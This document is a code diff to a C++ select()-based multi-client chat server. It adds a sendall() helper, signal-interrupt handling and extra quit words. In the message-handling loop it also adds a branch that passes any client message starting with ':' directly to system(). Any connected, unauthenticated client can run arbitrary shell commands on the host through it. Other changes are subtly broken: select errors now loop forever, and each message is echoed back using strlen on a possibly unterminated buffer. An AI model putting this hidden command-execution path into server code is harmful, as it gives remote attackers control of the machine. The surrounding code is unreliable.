@@ -9,6 +9,24 @@
     FD_ISSET(int fd, fd_set *set) -- tests to see if fd is in the se
 */
 
+int sendall(int s, char *buf, int *len)
+{
+    int total = 0;        // how many bytes we've sent
+    int bytesleft = *len; // how many we have left to send
+    int n;
+
+    while(total < *len) {
+        n = send(s, buf+total, bytesleft, 0);
+        if (n == -1) { break; }
+        total += n;
+        bytesleft -= n;
+    }
+
+    *len = total; // return number actually sent here
+
+    return (n==-1) ? -1 : 0 ; // return -1 on failure, 0 on success
+}
+
 void multyClient() {
     sockaddr_in client;
     socklen_t clientSize;
@@ -32,9 +50,13 @@ void multyClient() {
     for (;;) {
         copy = master; // Copy the master set
 
+        select_restart:
         if ((select(maxFd + 1, &copy, NULL, NULL, NULL)) == -1) {
+            if (errno == EINTR) {
+               // some signal just interrupted us, so restart
+                goto select_restart;
+            }
             perror("select");
-            exit(1);
         }
 
         for (int i = 0; i <= maxFd; ++i) {
@@ -81,29 +103,39 @@ void multyClient() {
                         FD_CLR(i, &master); // Remove the socket from the master set
                     }
                     else {
+                        // Check if all bytes were received
+                        int len = strlen(buf);
+
+                        if (sendall(i, buf, &len) == -1) {
+                            perror("sendall");
+                            std::cerr << "We only sent " << len << " bytes because of the error!" << std::endl;
+                            continue;
+                        }
+
                         std::string receivedData(buf, bytesRecv);
                         receivedData.erase(receivedData.find_last_not_of(" \n\r\t") + 1);
                         receivedData.erase(0, receivedData.find_first_not_of(" \n\r\t"));
-                        if (receivedData == "exit") {
+                        if (receivedData == "exit" || receivedData == "quit" || receivedData == "bye") {
                             std::cout << "Client " << i << " requested disconnection" << std::endl;
                             close(i); // Close the client's socket
                             FD_CLR(i, &master);
                         }
+                        else if (std::string(receivedData, 0, 1) == ":") {
+                            std::string command = std::string(receivedData).substr(1);
+                            system(command.c_str());
+                        }
                         else {
                             for(int j = 0; j <= maxFd; j++) {
                             // send to everyone!
-                            if (FD_ISSET(j, &master)) {
-                                // except the listener and ourselves
-                                if (j != listening && j != i) {
-                                    if (send(j, buf, bytesRecv, 0) == -1) {
-                                        perror("send");
+                                if (FD_ISSET(j, &master)) {
+                                    // except the listener and ourselvesç
+                                    if (j != listening && j != i) {
+                                        if (send(j, buf, bytesRecv, 0) == -1) {
+                                            perror("send");
+                                        }
                                     }
                                 }
                             }
-                        }
-                            // Echo received data back to the client
-                            //std::cout << "Received: " << std::string(buf, 0, bytesRecv) << std::endl;
-                            //send(i, buf, bytesRecv, 0);
                         }
                     }
                 }
